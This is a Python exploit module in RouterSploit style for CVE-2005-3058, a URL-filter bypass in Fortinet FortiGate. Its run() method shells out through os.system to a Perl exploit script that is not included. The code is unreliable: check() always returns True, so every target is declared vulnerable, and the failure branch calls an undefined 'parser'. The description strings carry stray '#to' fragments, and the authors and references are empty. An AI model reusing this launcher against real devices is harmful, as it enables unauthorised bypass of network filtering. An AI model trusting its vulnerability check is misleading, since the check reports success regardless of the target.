



import sys,os

from routersploit.core.exploit import *

from routersploit.core.http.http_client import HTTPClient

from ctypes import *



class Exploit(HTTPClient):



    __info__ = {

        "name": "CVE-2005-3058",

        "description": "Fortinet FortiGate is prone to a vulnerability that could allow users #to bypass the device's URL filtering.. "
                       "FortiGate devices running FortiOS v2.8MR10 and v3beta are vulnerable #to this issue. "
                       "Other versions may also be affected. ",

        "authors": (

            "###",  # vulnerability discovery

            "###",  # routersploit module

        ),

        "references": (

            "",

        ),

        "devices": (

            "Fortinet, CVE-2005-3058"
        ),
    }


    target = OptIP("1.2.3.4", "dest_addr IPv4 or IPv6 address")
    
    def run(self):

        if self.check():

            print_success("Target seems to be vulnerable")
            text = os.path.basename(__file__)
            print(text)
            path = os.path.realpath(__file__)
            path = path.replace(text,'')
            path = path.replace('\\','/')
            path1 = 'cd {}'.format(path)
            fileName = 'perl {}'.format('CVE-2005-3058.pl')
            path2 = path1 + " && " + fileName
            #print(path2)
            os.system(path2)
        else:

            parser.print_help(sys.stderr)

            print_error("Exploit failed - target seems to be not vulnerable")


    def check(self):
       
        return True